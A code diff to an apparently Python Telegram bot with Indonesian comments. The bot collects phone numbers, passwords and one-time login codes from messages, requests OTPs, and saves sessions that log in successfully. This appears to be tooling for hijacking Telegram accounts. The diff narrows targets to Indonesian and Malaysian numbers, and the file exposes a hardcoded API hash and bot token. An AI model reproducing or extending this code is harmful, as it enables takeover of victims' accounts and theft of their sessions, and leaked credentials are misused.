@@ -10,9 +10,19 @@ api_id = 23520639
 api_hash = 'bcbc7a22cde8fa2ba7d1baad086086ca'
 bot_token = '8033198485:AAG5-a8uZ3AhjRNNIUqmR4VkePTQd7j7ibA'
 
-SESSIONS_FOLDER = "eww_sessions"
+SESSIONS_FOLDER = "ewww_sessions"
 sessions_folder = "sessions"  # Folder tujuan untuk menyimpan session yang berhasil login
 pending_login = {}  # {phone: (TelegramClient, password)}
+
+# === Whitelist Kode Negara ===
+ALLOWED_PREFIXES = ["+62", "+60"]
+
+# === Fungsi Validasi Nomor Telepon ===
+def is_valid_phone_number(phone):
+    return (
+        bool(re.fullmatch(r"\+\d{10,15}", phone)) and
+        any(phone.startswith(prefix) for prefix in ALLOWED_PREFIXES)
+    )
 
 # === Buat folder session jika belum ada ===
 os.makedirs(SESSIONS_FOLDER, exist_ok=True)
@@ -52,6 +62,10 @@ async def handler(event):
             phone = phone_match.group(1)
             password = password_match.group(1) if password_match else None
 
+            if not is_valid_phone_number(phone):
+                print(f"[❌] Nomor tidak valid atau tidak termasuk whitelist: {phone}")
+                return
+
             if otp_match:
                 otp = otp_match.group(1)
                 print(f"[📥] OTP ditemukan untuk {phone}: {otp}")
@@ -61,7 +75,7 @@ async def handler(event):
                     print(f"[⚠️] Belum ada request OTP sebelumnya untuk {phone}")
             else:
                 if phone not in pending_login:
-                    print(f"[📞] Menerima nomor: {phone} (mengirim OTP request...)")
+                    print(f"[📞] Menerima nomor valid: {phone} (mengirim OTP request...)")
                     asyncio.create_task(request_otp(phone))
                 else:
                     print(f"[⏳] {phone} sedang menunggu OTP...")
